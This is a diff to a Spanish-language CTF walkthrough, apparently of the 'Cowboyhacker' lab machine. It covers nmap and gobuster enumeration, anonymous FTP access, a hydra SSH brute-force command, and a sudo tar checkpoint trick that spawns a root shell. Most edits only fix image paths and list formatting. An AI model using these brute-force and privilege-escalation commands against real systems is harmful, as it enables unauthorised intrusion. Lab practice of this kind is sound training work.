@@ -8,7 +8,7 @@ Para empezar, ejecutaremos el siguiente escaneo para la enumeración de puertos:
 nmap <ipdelamaquina>
 ```
 
-![Untitled](Cowboyhacker/Untitled.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled.png)
 
 ssh port: 22
 
@@ -24,7 +24,7 @@ Vamos a intentar acceder a algún directorio oculto de la máquina haciendo fuer
 gobuster dir -u [http://<ip_de_la_maquina>](http://%3Cip_de_la_maquina%3E/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-![Untitled](Cowboyhacker/Untitled%201.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%201.png)
 
 **Directorios encontrados con éxito:**
 
@@ -46,19 +46,19 @@ anonymous:
 
 Conseguimos acceso al ftp de forma anónima, con el usuario “anonymous":
 
-![Untitled](Cowboyhacker/Untitled%202.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%202.png)
 
 Una vez tenemos acceso, listamos el directorio raíz, para ver el contenido:
 
-![Untitled](Cowboyhacker/Untitled%203.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%203.png)
 
 Una vez hecho esto, descargamos los ficheros de texto:
 
-![Untitled](Cowboyhacker/Untitled%204.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%204.png)
 
 Y examinamos su contenido:
 
-![Untitled](Cowboyhacker/Untitled%205.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%205.png)
 
 ## SSH
 
@@ -72,11 +72,11 @@ Comando para hacer fuerta bruta al login:
 hydra -l lin -P locks.txt <ip_de_la_maquina> ssh
 ```
 
-![Untitled](Cowboyhacker/Untitled%206.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%206.png)
 
 Accedemos por SSH al usuario lin:
 
-![Untitled](Cowboyhacker/Untitled%207.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%207.png)
 
 Una vez tengamos acceso al SSH daríamos paso a una escalada de privilegios, porque tenemos que conseguir el fichero root.txt. Lo cual puede ser una pista de dónde se debe encontrar este fichero.
 
@@ -90,13 +90,13 @@ Escalación de privilegios en un sistema linux:
 sudo -l
 ```
 
-![Untitled](Cowboyhacker/Untitled%208.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%208.png)
 
 2. Ahora sabemos que puede ejecutar “tar” como aministrador.
 
 3. Buscamos un script de tar en [gtfobins](https://gtfobins.github.io/).
 
-![Untitled](Cowboyhacker/Untitled%209.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%209.png)
 
 4. Ejecutamos el comando:
 
@@ -106,11 +106,11 @@ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 5. Una vez hecho esto, tenemos acceso a una shell donde nos podemos convertir en administradores:
 
-![Untitled](Cowboyhacker/Untitled%2010.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%2010.png)
 
 6. Hecho esto, es cuestión de buscar el root.txt:
 
-![Untitled](Cowboyhacker/Untitled%2011.png)
+![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%2011.png)
 
 ## Resumen del documento:
 
@@ -147,36 +147,38 @@ gobuster dir -u [http://](http://10.10.63.5/)<ipdelamaquina>-w /usr/share/wordli
 
 4. **Nombre del escritor de task.txt (ver en archivo)**
 
+
 5. **SSH login**
 
-5.1 **ssh bruteforce command:**
 
-user: lin
+- **ssh bruteforce command:**
 
-password: ******************
+   user: lin
 
-5.2 **user.txt** **flag**
+   password: ******************
+
+- **user.txt** **flag**
 
 6. **Privilege escalation**:
 
-6.1 **Comandos que lin puede usar como root (**sudo -l**):**
+- **Comandos que lin puede usar como root (**sudo -l**):**
 
-> /bin/tar
-> 
+    > /bin/tar
+    > 
 
-6.2 **Comando tar usado para obtener una shell con privilegios:**
+- **Comando tar usado para obtener una shell con privilegios:**
 
-```bash
-sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-```
+    ```bash
+    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+    ```
 
-6.3 **Usando una shell como usuario root**
+- **Usando una shell como usuario root**
 
-```bash
-sudo su 
-```
+    ```bash
+    sudo su 
+    ```
 
-1. **Buscamos el archivo root.txt**
+7. **Buscamos el archivo root.txt**
 
   Buscamos en el directorio del usuario root una vez somos root
 
